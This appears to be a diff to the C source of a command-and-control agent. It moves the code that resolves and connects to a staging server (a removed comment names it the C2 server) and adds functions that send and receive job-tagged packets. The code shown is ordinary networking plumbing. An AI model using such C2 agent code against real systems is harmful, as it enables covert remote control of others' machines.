@@ -24,6 +24,7 @@
 #include "util.h"
 
 bool agent_connect(agent_t *agent) {
+  struct sockaddr addr;
   struct timeval timeout = {
       .tv_sec  = 10,
       .tv_usec = 0,
@@ -39,7 +40,15 @@ bool agent_connect(agent_t *agent) {
   }
 #endif
 
-  if((agent->socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
+  bzero(agent, sizeof(agent_t));
+  bzero(&addr, sizeof(addr));
+
+  if(!resolve(&addr, STAGE_SERVER_HOST, STAGE_SERVER_PORT)){
+    debug("failed to resolve %s:%d: %s", STAGE_SERVER_HOST, STAGE_SERVER_PORT);
+    goto fail;
+  }
+
+  if((agent->socket = socket(addr.sa_family, SOCK_STREAM, IPPROTO_TCP)) < 0) {
     debug("failed to create a socket: %s", strerror(errno));
     return false;
   }
@@ -52,15 +61,6 @@ bool agent_connect(agent_t *agent) {
   if (setsockopt(agent->socket, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {
     debug("setsockopt failed for SO_SNDTIMEO: %s", strerror(errno));
     return false;
-  }
-
-  // connect to the C2 server
-  struct sockaddr addr;
-  bzero(&addr, sizeof(addr));
-
-  if(!resolve(&addr, STAGE_SERVER_HOST, STAGE_SERVER_PORT)){
-    debug("failed to resolve %s:%d: %s", STAGE_SERVER_HOST, STAGE_SERVER_PORT);
-    goto fail;
   }
 
   if (connect(agent->socket, &addr, sizeof(addr)) < 0) {
@@ -80,4 +80,18 @@ void agent_disconnect(agent_t *agent) {
 
   close(agent->socket);
   agent->socket = 0;
+}
+
+bool agent_send(agent_t *agent, packet_t *packet){
+  packet->header.session = agent->session;
+  packet->header.job_id = agent->job_id;
+  return packet_send(packet, agent->socket);
+}
+
+bool agent_recv(agent_t *agent, packet_t *packet) {
+  if(packet_recv(packet, agent->socket)){
+    agent->job_id = packet->header.job_id;
+    return true;
+  }
+  return false;
 }
